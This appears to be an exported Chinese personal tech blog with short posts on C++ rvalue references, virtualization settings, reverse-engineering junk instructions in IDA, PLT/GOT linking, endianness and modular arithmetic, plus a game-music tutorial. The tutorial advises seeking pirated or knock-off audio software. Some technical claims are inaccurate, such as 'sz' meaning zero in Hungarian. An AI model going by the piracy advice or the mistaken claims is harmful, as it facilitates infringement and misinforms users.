class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;main()&quot;</span>);</span><br><span class="line">  <span class="built_in">process_shape</span>(<span class="built_in">circle</span>(), <span class="built_in">triangle</span>());<span class="comment">//good   </span></span><br><span class="line">  result&amp;&amp; r = <span class="built_in">process_shape</span>(<span class="built_in">circle</span>(), <span class="built_in">triangle</span>());<span class="comment">//good</span></span><br><span class="line">  <span class="type">const</span> result&amp; r = <span class="built_in">process_shape</span>(<span class="built_in">circle</span>(), <span class="built_in">triangle</span>());<span class="comment">//good</span></span><br><span class="line">  result&amp; r = <span class="built_in">process_shape</span>(<span class="built_in">circle</span>(), <span class="built_in">triangle</span>());<span class="comment">//cannot be compiled</span></span><br><span class="line">  result&amp;&amp; r = std::<span class="built_in">move</span>(<span class="built_in">process_shape</span>( <span class="built_in">circle</span>(), <span class="built_in">triangle</span>()));<span class="comment">// can be compiled, but wrong; out of lifetime</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;something else&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上述问题的参考资料:https://herbsutter.com/2008/01/01/gotw-88-a-candidate-for-the-most-important-const/</p>
<p>https://time.geekbang.org/column/article/169268</p>
<p>effective C++ 中文版p94</p>
<p>需要注意的是, 标准库里面的移动构造函数都会把原始对象的指针设置成nullptr, 因为移动的含义就是所有权转交, 那么原先的所有者(房客)持有的地址信息(房屋钥匙)就应当被销毁</p>
<p>例子如下</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">string a=<span class="string">&quot;sdfasdfasdf&quot;</span>;</span><br><span class="line"><span class="function">string <span class="title">b</span><span class="params">(std::move(a))</span></span>;</span><br><span class="line"><span class="comment">//此时a的值为&quot;&quot;</span></span><br></pre></td></tr></table></figure>
<p>最后一个问题, 为什么 <code>const result&amp;</code> 可以被绑定到右值上, 同时<code>result&amp;&amp;</code>也可以绑定右值?</p>
<p>因为这是C++03历史弥留问题, 关于这一部分参考资料</p>
<p>https://www.quora.com/In-C++-why-are-const-reference-types-allowed-to-bind-to-rvalues</p>
<p>https://herbsutter.com/2008/01/01/gotw-88-a-candidate-for-the-most-important-const/</p>
<p>https://changkun.de/modern-cpp/zh-cn/03-runtime/#3-3-%E5%8F%B3%E5%80%BC%E5%BC%95%E7%94%A8</p>
<p>那么为什么C++11之后不逐渐弃用左值常量引用的历史特殊性呢?</p>
<p>答案是为了区分拷贝构造函数和移动构造函数</p>
<p>请看这里https://www.zhihu.com/question/437590377/answer/2972237413</p>
]]></content>
      <categories>
        <category>C++简明进阶教程</category>
      </categories>
      <tags>
        <tag>C++简明进阶教程</tag>
      </tags>
  </entry>
  <entry>
    <title>为什么hyper-V和VM conflict</title>
    <url>/wei-shi-me-hyper-v-he-vm-conflict/</url>
    <content><![CDATA[<p>如果开了hyper-v那么整台Windows物理机都是hyper-V虚拟化的,hyper-v的效率和一台普通物理机的效率是差不多的</p>
<p>而对于VM来说就相当于运行在虚拟机里面</p>
<p>所以报错,不能双重虚拟化</p>
<p>比较麻烦的解决方法是</p>
<blockquote>
<p>如果要用VMware，暂时关闭Hyper-v或沙盒功能，命令如下：<br />
（1）以管理员身份（win + x）运行命令提示符；<br />
（2）执行命令：bcdedit /set hypervisorlaunchtype off<br />
（3）重启系统，运行vm即可。</p>
<p>如果要恢复使用沙盒功能：<br />
（1）以管理员身份（win + x）运行命令提示符；<br />
（2）执行命令：bcdedit / set hypervisorlaunchtype auto<br />
（3）重启系统，运行Sandbox即可。</p>
<p>作者：WHOANIl<br />
链接：https://www.jianshu.com/p/73ccf4af4a67<br />
来源：简书<br />
著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</p>
</blockquote>
<p>一般沙盒就用来测试不安全软件的</p>
<p>所以一般保持关闭即可</p>
]]></content>
      <categories>
        <category>笔记</category>
        <category>存档</category>
      </categories>
      <tags>
        <tag>环境配置</tag>
        <tag>虚拟化</tag>
      </tags>
  </entry>
  <entry>
    <title>为什么可执行文件要分段</title>
    <url>/wei-shi-me-ke-zhi-xing-wen-jian-yao-fen-duan/</url>
    <content><![CDATA[<p>常见，关键，但十分表层的理由是，为了区分可写和只读区域，防止有意或者无意或者恶意的修改</p>
<p>更深层的理由是为了提高CPU分支预测的准确率</p>
<p>指令缓存的造价与数据缓存的造价差异较大，而且分支预测的前提是尽量多的了解已经执行的操作</p>
<p>分类很有利于这种了解</p>
<p>最重要的原因和链接的原因很相似</p>
<p>为了只保存一份代码，副本只需要复制数据区</p>
]]></content>
      <categories>
        <category>信息安全</category>
        <category>开发</category>
        <category>二进制</category>
      </categories>
  </entry>
  <entry>
    <title>什么是lambda函数？为什么需要lambda函数？lambda函数的本质是什么？如何正确应用lambda函数？</title>
    <url>/shi-me-shi-lambda-han-shu-wei-shi-me-xu-yao-lambda-han-shu-lambda-han-shu-de-ben-zhi-shi/</url>
    <content><![CDATA[<h2 id="背景">背景</h2>
<p>环境python3</p>
<h2 id="正文">正文</h2>
<p>lambda函数，也就是匿名函数，最初学习python的时候一直觉得很难理解，其实他和汇编的invoke，proc有异曲同工之妙</p>
<p>匿名函数的返回值应当被理解为函数对象的入口点地址（python里面地址也是广义的对象）</p>
<p>我们一般会在使用map或构建无需（甚至是不便于）声明函数实体对象的递归时使用匿名函数，以简化逻辑，减少名称污染</p>
<p>本质上来说应当被理解为汇编里面的子例，而且是过程子例</p>
<p>正确运用匿名函数的前提是正确理解汇编的参数序列和局部变量声明以及他们的应用</p>
<p>示例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">f = lambda x: x * x</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>杂谈</category>
        <category>开发</category>
      </categories>
  </entry>
  <entry>
    <title>DELL G5 15pro 5587上使用的Intel Wireless-AC 9560 160MHz 无线网卡疑似电磁干扰的提示</title>
    <url>/guan-yu-dell-g5-15pro-5587-shang-shi-yong-de-intel-wireless-ac-9560-160mhz-wu-xian-wang-qia-yi-si-dian-ci-gan-rao/</url>
    <content><![CDATA[<p>注意，标题只说了疑似，我这边只说现象，无法给出100%的证明</p>
<p>事情是这样的</p>
<p>由于自身需求原因，笔者的戴尔G5 15pro 5587购买时选择了256GB的SSD，后来不够用了</p>
<p>在京东官方旗舰店购买了一根SN550 512GB （WDC WDS500G2BOC- 00PXHO，详细信息如下）自带了一块马甲和硅胶导热贴</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">已配置设备 SCSI\Disk&amp;Ven_NVMe&amp;Prod_WDC_WDS500G2B0C-\5&amp;35596c80&amp;0&amp;000000。</span><br><span class="line"></span><br><span class="line">驱动程序名称: disk.inf</span><br><span class="line">类 GUID: &#123;4d36e967-e325-11ce-bfc1-08002be10318&#125;</span><br><span class="line">驱动程序日期: 06/21/2006</span><br><span class="line">驱动程序版本: 10.0.19041.789</span><br><span class="line">驱动程序提供商: Microsoft</span><br><span class="line">驱动程序部分: disk_install.NT</span><br><span class="line">驱动程序等级: 0xFF0007</span><br><span class="line">匹配设备 ID: GenDisk</span><br><span class="line">低等级驱动程序: </span><br><span class="line">设备已更新: false</span><br><span class="line">父设备: PCI\VEN_15B7&amp;DEV_5009&amp;SUBSYS_500915B7&amp;REV_01\4&amp;2b082314&amp;0&amp;00E8</span><br><span class="line"></span><br><span class="line">已启动设备 SCSI\Disk&amp;Ven_NVMe&amp;Prod_WDC_WDS500G2B0C-\5&amp;35596c80&amp;0&amp;000000。</span><br><span class="line"></span><br><span class="line">驱动程序名称: disk.inf</span><br><span class="line">类 GUID: &#123;4d36e967-e325-11ce-bfc1-08002be10318&#125;</span><br><span class="line">服务: disk</span><br><span class="line">低层筛选程序: </span><br><span class="line">高层筛选程序: </span><br></pre></td></tr></table></figure>
<p>在安装硅胶贴和散热马甲时，出了一些意外，硅胶贴粘了一些灰尘，导致散热马甲黏贴不稳定，会翘起一些</p>
<p>换用SSD结束后笔者立刻发现一个现象：蓝牙和wifi会时不时自动断开，而且一旦断开必定是同时断开（具体表现为蓝牙耳机和网络同时消失）</p>
<p>一开始笔者只是以为更换SSD时不小心摸到了哪个电阻电容什么的，导致损坏了什么东西</p>
<p>后来看了一个视频，大受启发，视频粘贴如下<a href="https://link.zhihu.com/?target=https%3A//www.bilibili.com/video/BV1t44y1v7Lx">【官方双语】Valve到底藏了啥？- Steam Deck拆解视频观看反应#linus谈科技_哔哩哔哩_bilibili​www.bilibili.com/video/BV1t44y1v7Lx</a></p>
<p>大致内容为：Steam Deck游戏机内部，wifi模块与SSD间隔很近，互相之间有干扰，官方提示务必盖好屏蔽罩</p>
<p>同时我注意到本机的wifi蓝牙模块物理意义上距离SSD较近</p>
<p>后续我尝试移除马甲，一切问题消失</p>
<p>再次尝试安装马甲，问题具有可重现性（已尽可能做到控制变量）</p>
]]></content>
      <categories>
        <category>笔记</category>
        <category>杂谈</category>
        <category>存档</category>
        <category>计算机</category>
      </categories>
      <tags>
        <tag>DELL</tag>
      </tags>
  </entry>
  <entry>
    <title>关于priority encoder芯片的简单小分析</title>
    <url>/guan-yu-priority-encoder-xin-pian-de-jian-dan-xiao-fen-xi/</url>
    <content><![CDATA[<h2 id="背景">背景</h2>
<p>CIS221的实验</p>
<h2 id="正文">正文</h2>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172110571.png" /></p>
<p>电路图如上</p>
<p>首先看第一位bit0</p>
<p>bit0先用与/与非门控制, 当其他更高级的信号为0时与/与非门才会放过去</p>
<p>u13到u15的或门是选择</p>
<p>分别只有一个可能被选择通过</p>
<p>并且对应情况下会让bit1和bit2 bit3也改变</p>
<p>比如</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172110485.png" /></p>
<p>u13通过去了一个信号到bit0,但是并不知道这个bit0的信号是来自谁</p>
<p>所以需要这个信号连到bit1等处,来进一步判断来自谁</p>
<p>现在问题来了....</p>
<p>这个该怎么从0设计呢...</p>
<p>毕竟我是看着视频写的</p>
<p>总感觉逆向很好考虑</p>
<p>但是正向完全想不出来</p>
]]></content>
      <categories>
        <category>硬件</category>
        <category>芯片</category>
      </categories>
  </entry>
  <entry>
    <title>关于“sp-analysis failed为什么只需要检查、修改出口retn与假出口retn的sp，而无需过分检查中间流程的sp”一问的自问自答</title>
    <url>/guan-yu-sp-analysis-failed-wei-shi-me-zhi-xu-yao-jian-cha-xiu-gai-chu-kou-retn-yu-jia-chu/</url>
    <content><![CDATA[<p>首先是sp-analysis failed 的一些形成原因</p>
<p>又学到了一些花指令</p>
<p>简单来说就是retn被当作普通jmp使用来加花时，函数假出口点会导致 sp-analysis failed</p>
<p>此时我们需要让IDA认为假出口只是一个普通的jmp，而普通的jmp不会影响栈，所以我们只需要先在假出口处平衡一下</p>
<p>至于函数入口和假出口之间，一般不会有什么问题</p>
<p>本文主要解答的是假出口和真出口之间为什么不用一一检查</p>
<p>原因就在于待分析对象一定是能运行的，换句话来说他在动调时栈一定是平衡的，只是在递归下降分析算法中分析错误而已，所以中间的内容一定是“事实上的栈平衡”</p>
<p>实际上，在真出口处也是事实上的平衡，我们只需要让IDA能够正确分析出来真出口就行，中间的部分就算分析出来的sp错误也不影响，因为我们只需要让函数的大括号闭合，而内部的东西可以让IDA单纯认为是越界使用堆栈，而众所周知，汇编是一种不检查越界的语言（别杠保护段）</p>
]]></content>
      <categories>
        <category>信息安全</category>
        <category>二进制</category>
      </categories>
  </entry>
  <entry>
    <title>动态链接器笔记</title>
    <url>/dong-tai-lian-jie-qi-bi-ji/</url>
    <content><![CDATA[<h2 id="背景">背景</h2>
<p>没想到笔者在二进制入门级阶段就已经能够搜索到如此多错误资料....</p>
<p>英文搜索+ELF标准文档掘地三尺+翻Linux内核开发日志,确定了一些很在意要点</p>
<p>记录如下(仍然有很多疑问点,不保证完全正确性)</p>
<h2 id="正文">正文</h2>
<p>因为感到奇怪的细节实在是太多了(侧面说明开发一个编译器,链接器,装载器,重定位解释器是如何的困难),所以并不会按照某种顺序记录,只是大杂烩记录一些东西</p>
<p>首先是为什么需要PLT表,为了解释这一点,先补一个现行PLT和GOT的运作机制</p>
<p>在</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Program                PLT                                 printf</span><br><span class="line">+---------------+      +------------------+                +-----+</span><br><span class="line"> ...                  push [0x603008]  &lt;---+       +--&gt; ... </span><br><span class="line"> call j_printf --+    jmp [0x603010]   ----+--...--+   +-----+</span><br><span class="line"> ...                 ...                  </span><br><span class="line">+---------------+  +--&gt; jmp [printf@GOT] -+  </span><br><span class="line">                        push 0xf         &lt;+  </span><br><span class="line">                        jmp 0x400da0     ----+</span><br><span class="line">                        ...              </span><br></pre></td></tr></table></figure>
<p>其中，<code>...</code>代表各种间接与PLT联系的机制，包括GOT</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181052925.png" /></p>
<p>现在有一个问题：为什么出现了PLT表，而不是单纯一个GOT表——这在技术上来说似乎是可以轻易实现的</p>
<p>为什么产生了这样的冗余——大可以类似于保护代码段的方法保护GOT表：就算这样不保险，为什么排除安全问题的情况下，也出现了PLT——为什么所有主流编译器允许开启危险编译选项却不允许放弃PLT</p>
<p>然后再补一个笔者纸上谈兵的，仅有GOT的实现</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181052122.png" /></p>
<p>GOT里面存着变量</p>
<p>这种做法，不考虑安全的话实际上完全可以实现，但是问题此时不在于动态链接器，而是编译器</p>
<p>因为编译到目标文件的时候，编译器并不知道某个函数是动态链接库里面的函数还是在目标文件中</p>
<p>当然，这可以在C语言初期解决：采用特殊语法（出现动态链接功能的年代已经不能算是编译器发明的初期了）</p>
<p>同时最重要的，最关键的因素是重定位</p>
<p>我们不能保证GOT表不被强制重定位</p>
<p>而且就算解决了重定位问题</p>
<p>还有一个最致命的底层问题</p>
<p><strong>替换前后call机器码不等长</strong></p>
<p>一个是五字节，一个是六字节（强行替换需要nop，或者是进一步的重定向，这样的话重定向工作简直是多了一到两倍）</p>
<p>我们必须解决以上所有问题，才能够只使用GOT表</p>
<p>而上述这些东西<strong>刚出现</strong>和<strong>庞大到不能改</strong>的时间节点各不相同，另外肯定还有许多笔者未搜索到的底层机制影响了这一功能</p>
<p>然后就是，dllimport这个语法功能，他确实完成了上述的一些操作，但是也有很致命的一点，如果一个文件用了这个语法然后编译成目标文件，此时便不能再和其他覆写了该函数的目标文件或静态库链接了</p>
<p>总的来说，这是一个两难问题，如果这个世界上真的只有GOT，那么也一定会出现某个小众操作系统的动态连接功能使用的是两层跳转的，更何况，GOT更适合权限管理——上述所有讨论都是建立在不考虑安全性之上，纯理论的基础上的</p>
<p>如果考虑安全性，其实这个问题毫无讨论意义</p>
<p>另外就是两个有意思的问题</p>
<p>能不能<strong>把静态库动态连接</strong>或者<strong>把动态库静态编</strong>译？</p>
<p>well，这个是分平台的</p>
<p>如果是Linux平台，.a文件其实不是ELF文件，搜索了一下没有找到静态库动态链接的方法</p>
<p>（施工中）</p>
<p>这部分暂时先放下，后面加在程序员自我修养读书笔记后面，放几个备忘链接先</p>
<p>https://stackoverflow.com/questions/1022120/do-i-need-static-libraries-to-statically-link</p>
<p>https://stackoverflow.com/questions/5720205/is-it-possible-to-statically-link-against-a-shared-object</p>
<p>https://stackoverflow.com/questions/725472/static-link-of-shared-library-function-in-gcc</p>
<p>https://stackoverflow.com/questions/4430645/possible-to-statically-link-shared-object-libraries</p>
<p>https://stackoverflow.com/questions/8331456/mixing-pic-and-non-pic-objects-in-a-shared-library</p>
]]></content>
      <categories>
        <category>信息安全</category>
        <category>笔记</category>
        <category>二进制</category>
        <category>编译原理</category>
      </categories>
      <tags>
        <tag>悬而未决</tag>
      </tags>
  </entry>
  <entry>
    <title>匈牙利命名法、前缀表示法、一些乌拉尔语系语言学小知识</title>
    <url>/xiong-ya-li-ming-ming-fa-qian-zhui-biao-shi-fa-yi-xie-wu-la-er-yu-xi-yu-yan/</url>
    <content><![CDATA[<h2 id="背景">背景</h2>
<p>对szBuffer这个参数名有点疑惑sz的含义，顺藤摸瓜找到了很多很有意思的东西</p>
<h2 id="正文">正文</h2>
<p>首先是sz是匈牙利语当中“零”的简写</p>
<p>所以szBuffer是零结尾的缓冲区</p>
<p>然后顺着维基去学了一点匈牙利语，顺便发现和德语的合字ß有一些千丝万缕的联系，查了一下相关字母发展史</p>
<p>演化路径有两条</p>
<p>长S和z <strong>ſ</strong>z</p>
<p>长S和s <strong>ſ</strong>s</p>
<p>匈牙利语属于乌拉尔语系而德语属于典型的印欧语系</p>
<p>但是在这个连字上，演化规律和路径相似</p>
<p>同时顺便还看见了波兰计数法，由于之前课设甚至考虑过符号运算顺序栈，所以一下子被吸引住了</p>
<p>放几段维基感受一下</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172101090.png" /></p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172101051.png" /></p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172101859.png" /></p>
]]></content>
      <categories>
        <category>杂谈</category>
        <category>开发</category>
        <category>语言学</category>
      </categories>
  </entry>
  <entry>
    <title>参数传递和异常传递的异同之处</title>
    <url>/can-shu-chuan-di-he-yi-chang-chuan-di-de-yi-tong-zhi-chu/</url>
    <content><![CDATA[<p>参数的传递和异常的传递有相似之处</p>
<p>首先, 显而易见的是, 他们都有by value, by pointer, by reference 三种</p>
<p>(待更新)</p>
]]></content>
      <categories>
        <category>C++简明进阶教程</category>
      </categories>
      <tags>
        <tag>C++简明进阶教程</tag>
      </tags>
  </entry>
  <entry>
    <title>复位（reset）的作用</title>
    <url>/fu-wei-reset-de-zuo-yong/</url>
    <content><![CDATA[<p>主要是为了同步性安全</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172114055.png" /></p>
<p>异步敏感列表或者是同步检查时需要</p>
<p>复位不一定是清0也有可能是置1</p>
]]></content>
      <categories>
        <category>笔记</category>
        <category>校内</category>
        <category>计组</category>
      </categories>
  </entry>
  <entry>
    <title>大端和小端的简单笔记</title>
    <url>/da-duan-he-xiao-duan-de-jian-dan-bi-ji/</url>
    <content><![CDATA[<p>我们写数字,比如100000</p>
<p>是先写高位1,再从高往低写到最低位0</p>
<p>但是Windows操作系统环境下80386CPU读写一般采取完全遵照从低到高</p>
<p>比如mov EAX,mytest ;mytest为变量名</p>
<p>那么从mytest低位开始</p>
<p>mytest低位写入eax低位</p>
<p>同样,定义数据时</p>
<p>比如ABCDh</p>
<p>CD先放到内存低位</p>
<p>然后AB放到内存高位</p>
<p>这样就变成了 CD AB</p>
]]></content>
      <categories>
        <category>笔记</category>
        <category>存档</category>
      </categories>
  </entry>
  <entry>
    <title>大端序Windows PE文件逆向关键函数</title>
    <url>/da-duan-xu-windows-pe-wen-jian-ni-xiang-guan-jian-han-shu/</url>
    <content><![CDATA[<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172114249.png" /></p>
<p>图中的函数为大小端序转换函数</p>
<p>遇到了一个题目是出题人自己的壳，而且壳解压过程中还把默认小端序的PE文件的一部分堆栈转换成了大端序，操作太骚了</p>
<p>再往后面是TEA加密的非标准实现，看WP也不懂，姑且放弃了</p>
]]></content>
      <categories>
        <category>黑历史与垃圾</category>
      </categories>
  </entry>
  <entry>
    <title>如何从零开始制作游戏配乐</title>
    <url>/ru-he-cong-ling-kai-shi-zhi-zuo-you-xi-pei-le/</url>
    <content><![CDATA[<ol type="1">
<li>本文涉及到的资源和教程没有出于任何广告和推广的目的，都是我亲自使用过的教程和资源，原作者没有给我宣传费；侵删</li>
</ol>
<p>未经授权，本文禁止转载！</p>
<hr />
<h2 id="导论">导论</h2>
<p>如果是编曲专业或者是数字作曲专业的学生，那么肯定是</p>
<p><strong>先学乐理，再学软件，最后实操</strong></p>
<p>但是我们野路子出身的不必这样，我们是为产品服务的</p>
<p>而上述流程是为成绩服务的</p>
<p>我建议是只需要知道大部分乐理术语，以及基础原理就行了</p>
<p>不必搞得像古典乐专业的学生那样，学了厚厚一本乐理</p>
<p>我觉得这样更合理：</p>
<p><strong>先学软件，然后简单实操，实操过程中补齐乐理</strong></p>
<p>那么问题来了，什么是乐理，如何学乐理？</p>
<p>什么样的软件是行业标准？</p>
<hr />
<h2 id="乐理">乐理</h2>
<p>如何学习乐理？</p>
<p>问专业出身的人给出的答复肯定是，买一本乐理入门书</p>
<p>推荐的书目大同小异</p>
<p>我承认那些书都很好，但是如果是零基础的话，看书实际上是非常难学进去的，摸不着头脑</p>
<p>我经经历那种痛苦</p>
<p>我更推荐去看<strong>音乐大师</strong>的<strong>视频</strong>课程</p>
<p>比如宋大叔：av51310803</p>
<p>这套乐理教程后面还附带了作曲教程</p>
<p>然后就是各位会看到大部分教程底下，经常有人强调<strong>乐感</strong>这个东西</p>
<p>我认为，我们这些野路子出来做音乐的</p>
<p>没必要有多大的乐感，因为培养这个要好几年的时间，可能做小体量游戏一年就能完成主体部分的开发了</p>
<p>如果你确实有乐感天赋，那更好，但是如果真的是零基础就别强求了</p>
<p>没有乐感造成的影响我后面再说</p>
<hr />
<h2 id="设备">设备</h2>
<p>设备方面的推荐：声卡、键盘、监听设备（耳机或者音箱）</p>
<p>声卡：声卡是必须的，不然就会像用集显玩COD一样，会卡顿（电流声）</p>
<p>500元-1000元上下的价位的声卡就基本足够了</p>
<p>（如果你本来就有9900K，那么实在不想买声卡也是可以的）（逃</p>
<p>键盘：如果你会弹钢琴，那么MIDI键盘可以极大提高你的作曲效率</p>
<p>如果你原先不会弹钢琴，那么在学习乐理的时候，你会发现各类乐理教程都其实教了基础弹钢琴的方法，介于作曲不是实时演奏、可以犯错误这一点，实际上只需要有乐理课上的那些基础钢琴知识，再在实际生产中稍加练习几天，拥有用来编曲的钢琴技术技术真的是绰绰有余了，可以极大提高你的效率，十分推荐</p>
<p>MIDI键盘需要1000-1500元左右就能买到中等产品了，推荐61键的。88键的大概率房间里面放不下，搬运也困难（可能会有租房搬家的问题），而且那么大的音域作曲一般用不上</p>
<p>监听设备：其实如果预算不足的话，监听设备我建议就100元以内的普通耳机就行了，当然如果你已经买了一款还不错的游戏耳机，也可以使用，因为我们野路子出来的作曲，其实和99.99%普通玩家一样，听不出来很多细节的，所以说如果预算限制的话，买个和普通玩家一样的普通耳机，听到他们能听到的东西就足够了</p>
<hr />
<h2 id="宿主软件">宿主软件</h2>
<p>你必须一开始确定你的游戏需要什么类型的音乐比较多</p>
<p>是古典？轻电子？还是插电？</p>
<p>这对于选择软件十分重要</p>
<p>我目前用的是FL studio（偏向电子风格）</p>
<p>但是讲道理来说库乐队的功能更强大一些（古典、古风、电子都很适合，尤其是古风）（这两款是主流产品，其他的软件用的人比较少，教程也少）</p>
<p>（这里插一句，古典特指西方古典乐，古风特指中国的“古典乐”，之前有好多人和我交流的时候对这个分不清楚，造成了很多误会）</p>
<p>但是库乐队对新手不友好，优质教程数量远远少于FL</p>
<p>这里我推荐FL（又称为水果、萝卜、芒果）</p>
<p><img src="https://pic2.zhimg.com/80/v2-6c5ef12669efe8fa545dbc2fe99faaf9_720w.jpg" /></p>
<p>FL主界面</p>
<p>FL教程我推荐官网的教程：av50431643</p>
<p>然后是软件下载，这款软件实在是太贵了，有能力支持正版，实在不行以后补票</p>
<p>但是实际上这个软件的盗版也很不好找，被国内某家公司封杀了，实在需要找盗版建议去新加坡谷歌上找，或者是看看淘宝</p>
<hr />
<h2 id="音源">音源</h2>
<p>音源我推荐kontakt家族</p>
<p><img src="https://pic1.zhimg.com/80/v2-34941c1f7448db00e39c1c662f1ddccc_720w.jpg" /></p>
<p>Kontakt主界面</p>
<p>这个是行业标准</p>
<p>软件本体依旧很贵</p>
<p>实在不行就淘宝买个山寨，以后补票</p>
<p>然后就是kontakt下面的各大音源</p>
<p>比如柏林管弦、大珍珠钢琴、象牙钢琴这些都是行业标准</p>
<p>如何调配这些音源我推荐看这个视频：av82662692</p>
<p>视频里面推荐的音源都是行业标准</p>
<hr />
<h2 id="简单总结">简单总结</h2>
<p>我建议先学软件，而不是正规路子的先学乐理，因为在软件教程里面都会多多少少渗透一些乐理，学了软件之后马上就能简单实操</p>
<p>我建议先<strong>复现</strong>教程里面的旋律，想想为什么这个旋律有跳动感/恐怖感/欢快感……</p>
<p>然后进行改进，完善为demo曲，强化这首曲子给你的感觉</p>
<p>学完基础乐理之后进一步扩展为合格的曲子</p>
<hr />
<h2 id="adobe-au">Adobe AU</h2>
<p>宿主说完了说下Adobe AU</p>
<p>AU教程更多了</p>
<p>B站上随便选一个都很高质，这部分不详述</p>
<p>但是这东西一定要会用</p>
<p>不过学这个并不着急</p>
<p>等你能做出合格的曲子再学就行了</p>
<p>至于为什么，到时候你就知道了</p>
<hr />
<h2 id="自动生产工具重点">自动生产工具（重点）</h2>
<p><strong><em>重点来了！！！</em></strong></p>
<p>强力推荐 OrbComposerS</p>
<p>AI作曲，一次付费，终身使用</p>
<p>而且价格非常合理，这个软件目前没有盗版，买个正版吧</p>
<p>这个软件的效果：av50266684</p>
<p>效果真的是太好了</p>
<p>在此基础之上你可以改编，变奏</p>
<p>视频里面还推荐了其他软件，但是都性价比和效率太低</p>
<p>而且作品质量不高</p>
<p><img src="https://pic4.zhimg.com/80/v2-bd0fd695d780f022fb3d6e075d4711d3_720w.jpg" /></p>
<p>OrbComposerS主界面</p>
<hr />
<h2 id="乐感">乐感</h2>
<p>最后讲一下乐感到底影响了什么</p>
<p>影响<strong>扒谱</strong>和创作之初的<strong>灵感</strong></p>
<p>请自行百度扒谱是什么，你会发现原创曲用不上这项技能</p>
<p>然后是创作灵感，OrbComposerS已经为我们解决了</p>
<p>所以说我认为可以不用培养乐感，性价比太低</p>
<p>OrbComposerS这个软件在视频里面也说到了</p>
<p>一般也就是用来激发作曲灵感的</p>
<p>真的是非常好用</p>
<hr />
<h2 id="网站推荐">网站推荐</h2>
<p>https://www.exound.com/</p>
<p>https://www.midivst.com/</p>
<p>还有B站（优质教程特别多）</p>
<hr />
<h2 id="结束语">结束语</h2>
]]></content>
      <categories>
        <category>黑历史与垃圾</category>
      </categories>
  </entry>
  <entry>
    <title>如何在计算机底层将一部分浮点数运算，转换为等价的整数运算，从而大幅提高计算效率？</title>
    <url>/ru-he-zai-ji-suan-ji-di-ceng-jiang-yi-bu-fen-fu-dian-shu-yun-suan-zhuan-huan-wei-deng/</url>
    <content><![CDATA[<p>由于专业课需要，学了两个学期的数论，最后直到学完了也对群论没什么直观感, 最近在写信息论课设的时候遇到了C语言下的浮点数精度问题, 然后找到了一些数论中群论的应用,也就是本篇要讲的,满足某种情况的有理浮点数, 甚至是无理数运算(有额外限制)都可以使用这种方法进行算法优化</p>
<h2 id="正文">正文</h2>
<p>首先我需要默认读者有模运算基础, 如果没有, 请不要忽略这一部分 ​ 首先我们都知道普通的实数域下的加法如何计算, 这里就不搞一遍加法的精确定义了; 然后减法是加相反数, 实数域下求相反数比较简单, 只需要加一个负号, 我们后面会讲如何定义一个相反数运算 接下来我们需要定义一套新的加减乘除四则运算, 这套运算在数学上可证明是在某些情况下 与实数域上的, 我们平常使用的四则运算完全等价的, 要求如下:</p>
<ol type="1">
<li>我们需要找到一个足够大的质数p, 已知我们求解的问题的结果一定小于这个足够大的质数, 在一般情形下,大于1024的质数就可以胜任很多环境的工作了</li>
<li>我们运算的结果已知是整数, 但是运算过程中会参杂入浮点数, 比如计算斐波那契数列, 通项公式中参杂大量分数运算, 但是结果一定为整数</li>
<li>计算式子中可以包含根号, 但是根号下的内容只能有一种, 因为在我们新定义的乘法中,</li>
</ol>
<p><span class="math display">\[ \\sqrt{a}\\sqrt{b}\\neq\\sqrt{ab} \]</span> 这里以一个简单例子来构建我们新的四则运算体系 首先我们选取一个质数p=11 然后我们定义新加法, 新乘法 <span class="math display">\[ a\\oplus b = a+b\\mod 11 a\\otimes b = a\\times b\\mod 11 \]</span> 定义相反数运算 <span class="math display">\[ -a = 11-a \\mod 11 \]</span> 定义除法运算前, 需要先定义负一次方运算 负一次方运算又叫做 求逆元, 这个过程是有更简单的公式做到的, 但是我们这边采用暴力法 <span class="math display">\[ 设 a^{-1}=r 若a\\otimes r=1 (\\mod11) \]</span> 也就是说,在模11这个环里面, 有0-10总共十个数字, 找到一个数字与a进行O乘, 结果为1的数字, 就是a的逆元, 简称a的逆 比如3和4在模11环中互为逆元, 因为3*4 = 12 模11余1 定义除法为O乘逆元 所以有以下例子 <span class="math display">\[ 6+7=13 \\ 6\\oplus7=2 \\ 6\\times7=42 \\ 6\\otimes7=9 \\ -6=-6 \\ \\ominus6=5 \\ 3^{-1}=\\frac{1}{3} \\ 3^{\\ominus1}=4 \\ 7\\div10=\\frac{7}{10} \\ 7\\div10= 7\\otimes10^{\\ominus1}=7\\times10=4(这个是精髓) \]</span> 主要关注最后一行, 我们居然可以让一个分数等价映射为整数 从数学上可以证明, 只要我们的计算式满足上面说的三点, 我们的计算结果就一定是正确的 下面来点例子 <img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172122474.png" alt="image-20221229161224000" /></p>
<h2 id="参考资料">参考资料</h2>
<p>https://www.bilibili.com/video/BV1EM41117Dv</p>
]]></content>
      <categories>
        <category>笔记</category>
        <category>开发</category>
        <category>校内</category>
        <category>GamePlay</category>
        <category>离散</category>
      </categories>
  </entry>
  <entry>
    <title>实现图的过程中一些小笔记</title>
    <url>/shi-xian-tu-de-guo-cheng-zhong-yi-xie-xiao-bi-ji/</url>
    <content><![CDATA[<p>ds</p>
